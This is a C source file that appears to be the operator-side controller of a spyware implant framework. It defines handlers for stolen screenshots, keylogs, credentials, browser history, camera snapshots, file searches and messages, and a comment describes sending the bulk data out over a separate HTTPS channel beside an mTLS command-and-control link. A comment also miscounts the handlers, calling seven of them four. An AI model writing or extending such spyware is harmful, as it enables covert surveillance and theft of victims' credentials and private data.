#include "spyware_controller.h"
#include <stdio.h>
#include <sys/stat.h>
#include <errno.h>

/* Create the per-implant save directory if it does not already exist. */
void ensure_save_dir(const char *save_dir)
{
    if (mkdir(save_dir, 0755) != 0 && errno != EEXIST)
        fprintf(stderr, "[exfil] could not create %s\n", save_dir);
}

/* The four exfil handlers below no longer save data to disk.
 * The implant sends bulk data directly to exfil-receiver via HTTPS POST
 * on port 9443 — a separate channel from the mTLS C2 connection.
 * The C2 channel carries only a short acknowledgement string which these
 * functions print. Data is saved by exfil-receiver into exfil-data/. */

void handle_screenshot_response(Packet *resp, const char *save_dir)
{
    (void)save_dir;
    if (!resp) return;
    printf("<%.*s — check exfil-data/ on host>\n\n",
           resp->payload_len, resp->payload);
}

void handle_keylog_dump_response(Packet *resp, const char *save_dir)
{
    (void)save_dir;
    if (!resp) return;
    printf("<%.*s — check exfil-data/ on host>\n\n",
           resp->payload_len, resp->payload);
}

void handle_cred_steal_response(Packet *resp, const char *save_dir)
{
    (void)save_dir;
    if (!resp) return;
    printf("<%.*s — check exfil-data/ on host>\n\n",
           resp->payload_len, resp->payload);
}

void handle_history_steal_response(Packet *resp, const char *save_dir)
{
    (void)save_dir;
    if (!resp) return;
    printf("<%.*s — check exfil-data/ on host>\n\n",
           resp->payload_len, resp->payload);
}

void handle_camera_snapshot_response(Packet *resp, const char *save_dir)
{
    (void)save_dir;
    if (!resp) return;
    printf("<%.*s — check exfil-data/ on host>\n\n",
           resp->payload_len, resp->payload);
}

void handle_file_search_response(Packet *resp, const char *save_dir)
{
    (void)save_dir;
    if (!resp) return;
    printf("<%.*s — check exfil-data/ on host>\n\n",
           resp->payload_len, resp->payload);
}

void handle_messaging_steal_response(Packet *resp, const char *save_dir)
{
    (void)save_dir;
    if (!resp) return;
    printf("<%.*s — check exfil-data/ on host>\n\n",
           resp->payload_len, resp->payload);
}
